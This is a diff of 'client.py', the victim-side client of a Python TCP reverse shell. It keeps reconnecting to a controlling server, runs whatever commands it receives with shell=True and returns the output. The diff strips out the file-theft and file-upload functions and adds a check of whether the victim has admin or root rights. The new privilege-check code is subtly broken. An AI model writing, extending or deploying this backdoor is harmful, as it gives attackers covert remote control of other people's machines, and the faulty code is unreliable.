@@ -1,19 +1,9 @@
-# client.py
-# Works on Transmission Control Protocol (TCP)
-# Keeps tuning to establish the connection with Server
-# Change directory (executed 'cd' shell command)
-# TCP bi-directional data transfer (Infiltration and Exfiltration)-CLIENT
-
 import socket
 import subprocess
 import os
 import time
+import sys
 import ctypes
-
-
-def initiate():
-    tuneConnection()
-
 
 def tuneConnection():
     mySocket = socket.socket()
@@ -26,39 +16,6 @@ def tuneConnection():
 
         except:
             tuneConnection()
-
-
-def letGrab(mySocket, path):
-    if os.path.exists(path):
-        f = open(path, 'rb')
-        packet = f.read(5000)
-        while len(packet) > 0:
-            mySocket.send(packet)
-            packet = f.read(5000)
-        mySocket.send('DONE'.encode())
-    else:
-        mySocket.send('File not found'.encode())
-
-
-def letSend(mySocket, path, fileName):
-    if os.path.exists(path):
-        f = open(path + fileName, 'ab')
-        while True:
-            bits = mySocket.recv(5000)
-            if bits.endswith('DONE'.encode()):
-                # Write those last received bits without the word 'DONE' - 4 characters
-                f.write(bits[:-4])
-                f.close()
-                break
-            if 'File not found'.encode() in bits:
-                break
-            f.write(bits)
-
-#def is_admin():
-#    try:
-#        return ctypes.windll.shell32.IsUserAnAdmin() !=0
-#    except:
-#        return False
 
 def shell(mySocket):
     while True:
@@ -73,33 +30,6 @@ def shell(mySocket):
                 mySocket.send(informToServer.encode())
                 break
 
-        #elif "checkPrivilege" in command:
-            #if is_admin():
-                #mySocket.send(b"[+] Running with Admin Privileges\n")
-            #else:
-                #mySocket.send(b"[+] User Privileges. (No Admin Privileges)\n")
-
-        # command format: grab*<File Path>
-        # example: grab*C:\Users\John\Desktop\photo.jpeg
-        elif 'grab' in command.decode():
-            grab, path = command.decode().split("*")
-            try:
-                letGrab(mySocket, path)
-            except Exception as e:
-                informToServer = "[+] Some error occured. " + str(e)
-                mySocket.send(informToServer.encode())
-
-
-        # command format: send*<destination path>*<File Name>
-        # example: send*C:\Users\John\Desktop\*photo.jpeg
-        elif 'send' in command.decode():
-            send, path, fileName = command.decode().split("*")
-            try:
-                letSend(mySocket, path, fileName)
-            except Exception as e:
-                informToServer = "[+] Some error occured. " + str(e)
-                mySocket.send(informToServer.encode())
-
         elif 'cd' in command.decode():
             try:
                 code, directory = command.decode().split(" ", 1)
@@ -110,6 +40,15 @@ def shell(mySocket):
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
 
+        elif "checkPrivilege" in command:
+            try:
+                admin = 'admin' in os.popen('whoami /groups').read().lower() if sys.platform.startswith(
+                    "win") else os.geteuid() == 0
+                privilege = b"[+] Administrator Privileges." if admin else b"[+] User Privileges. (No Admin privileges)"
+                mySocket.send(privilege.encode())
+            except Exception as e:
+                mySocket.send(f"[+] Some Error Occurred: {str(e)}".encode())
+
         else:
             CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -118,7 +57,6 @@ def shell(mySocket):
 
 
 def main():
-    initiate()
-
+    tuneConnection()
 
 main()
